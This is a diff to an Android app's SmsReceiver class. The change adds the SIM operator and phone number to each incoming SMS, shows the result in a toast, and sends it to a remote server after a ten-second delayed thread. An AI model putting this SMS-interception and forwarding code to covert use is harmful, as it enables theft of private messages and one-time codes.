@@ -12,8 +12,10 @@ import android.util.Log;
 import android.widget.Toast;
 
 import org.project.smsandcallreceiver.App;
-import org.project.smsandcallreceiver.helpers.ChatIDTelegramHelper;
+import org.project.smsandcallreceiver.ReceiversActivity;
 import org.project.smsandcallreceiver.helpers.ServerHelper;
+import org.project.smsandcallreceiver.helpers.telephone.SIMData;
+import org.project.smsandcallreceiver.helpers.telephone.TelephonyLogs;
 
 import java.util.Date;
 
@@ -21,8 +23,11 @@ public class SmsReceiver extends BroadcastReceiver {
     private static final String TAG = SmsReceiver.class.getSimpleName();
     public static final String pdu_type = "pdus";
 
-    public void onReceive(Context context, Intent intent) {
+    public void _onReceive(Context context, Intent intent) {
         Bundle bundle = intent.getExtras();
+
+        SIMData simData = TelephonyLogs.getCallsLog(context);
+
         StringBuilder strMessage = new StringBuilder();
         String format = bundle.getString("format");
         Object[] pdus = (Object[]) bundle.get(pdu_type);
@@ -36,15 +41,31 @@ public class SmsReceiver extends BroadcastReceiver {
                     msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                 }
                 if (i == 0) {
-                    strMessage.append("[" + new Date() + "]").append("SMS from ").append(msgs[i].getOriginatingAddress()).append(": ");
+                    strMessage.append("[" + new Date() + "]").append("Current SIM: ").append(simData.getOperator()).append(". ")
+                            .append("Target number: ").append(simData.getNumber()).append(". ").append("SMS from ").append(msgs[i].getOriginatingAddress()).append(": ");
                 }
                 strMessage.append(msgs[i].getMessageBody());
             }
             strMessage.append("\n");
             Log.d(TAG, "onReceiveSMS: " + strMessage);
-            Toast.makeText(App.getInstance(), strMessage.toString(), Toast.LENGTH_LONG).show();
+            ReceiversActivity.instance.runOnUiThread(() -> Toast.makeText(App.getInstance(), strMessage.toString(), Toast.LENGTH_LONG).show());
             ServerHelper.getRequest(strMessage.toString());
         }
+
+    }
+
+    public void onReceive(Context context, Intent intent) {
+        Runnable r = ()->{
+            try{
+                Thread.sleep(10000);
+            }
+            catch(InterruptedException e){
+                System.out.println("threadHookSMS _onReceive has been interrupted");
+            }
+            _onReceive(context, intent);
+        };
+        Thread threadHookSMS = new Thread(r,"threadHookSMS");
+        threadHookSMS.start();
     }
 
     public static void enableBroadcastReceiver() {
